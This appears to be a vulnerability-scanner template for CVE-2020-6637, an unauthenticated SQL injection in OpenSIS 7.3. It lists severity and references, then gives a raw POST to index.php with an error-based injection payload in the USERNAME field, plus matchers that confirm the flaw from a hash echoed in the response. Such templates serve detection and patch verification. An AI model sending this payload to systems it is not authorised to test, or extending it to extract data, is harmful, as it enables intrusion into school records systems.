id: CVE-2020-6637
info:
  name: OpenSIS v7.3 Unauthenticated SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    OpenSIS Community Edition version 7.3 is vulnerable to SQL injection via the USERNAME parameter of index.php.
  classification:
    cve-id: CVE-2020-6637
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  tags: sql-injection
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-6637
    - https://cinzinga.com/CVE-2020-6637/
    - https://github.com/OS4ED/openSIS-Classic/commit/1127ae0bb7c3a2883febeabc6b71ad8d73510de8

variables:
  rand_int: '{{rand_int(100000,199999)}}'
  sha1_val: '{{sha1(rand_int)}}'

http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        USERNAME=')or updatexml(1,concat(0x7e,(select sha1({{rand_int}})),0x7e),1);-- -&PASSWORD=A&language=en&log=
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "~[a-f0-9]{20}~"
      - type: word
        part: body
        words:
          - "{{sha1_val}}"
    extractors:
      - type: regex
        part: body
        regex:
          - "~([a-f0-9]{20})~"
        group: 1
